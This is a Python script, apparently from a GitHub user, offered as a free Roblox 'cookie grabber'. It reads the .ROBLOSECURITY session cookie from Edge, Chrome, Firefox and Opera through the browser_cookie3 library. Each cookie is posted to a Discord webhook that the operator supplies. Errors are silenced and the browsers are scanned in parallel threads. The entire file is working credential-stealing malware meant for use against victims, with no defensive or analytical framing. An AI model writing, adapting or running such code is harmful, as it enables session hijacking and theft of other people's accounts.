



#  ░██████╗░█████╗░██████╗░██╗██████╗░████████╗██╗░░░██╗███╗░░██╗██╗██╗░░██╗--
 # ██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝██║░░░██║████╗░██║██║╚██╗██╔╝--
#  ╚█████╗░██║░░╚═╝██████╔╝██║██████╔╝░░░██║░░░██║░░░██║██╔██╗██║██║░╚███╔╝░--
#  ░╚═══██╗██║░░██╗██╔══██╗██║██╔═══╝░░░░██║░░░██║░░░██║██║╚████║██║░██╔██╗░--
#  ██████╔╝╚█████╔╝██║░░██║██║██║░░░░░░░░██║░░░╚██████╔╝██║░╚███║██║██╔╝╚██╗-
#  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░░╚═════╝░╚═╝░░╚══╝╚═╝╚═╝░░╚═╝---
#                        github.com/ScriptUnix 

                        # Credit me lol or die
 
 import browser_cookie3, requests, threading

                               #Put your webhook below in between the ""

WebHook = " Your discord webhook here "


































def MicrosoftEdge():
    try:
        cookies = browser_cookie3.edge(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "UX Grabber (FREE)", "content" : f"```{cookie}```"})
    except:
        pass

def GoogleChrome():
    try:
        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "UX Grabber (FREE)", "content" : f"```{cookie}```"})
    except:
        pass

def MozillaFirefox():
    try:
        cookies = browser_cookie3.firefox(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "UX Grabber (FREE)", "content" : f"```{cookie}```"})
    except:
        pass

def Opera():
    try:
        cookies = browser_cookie3.opera(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "UX Grabber (FREE)", "content" : f"```{cookie}```"})
    except:
        pass

browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera]

for v in browsers:
    threading.Thread(target = v).start()
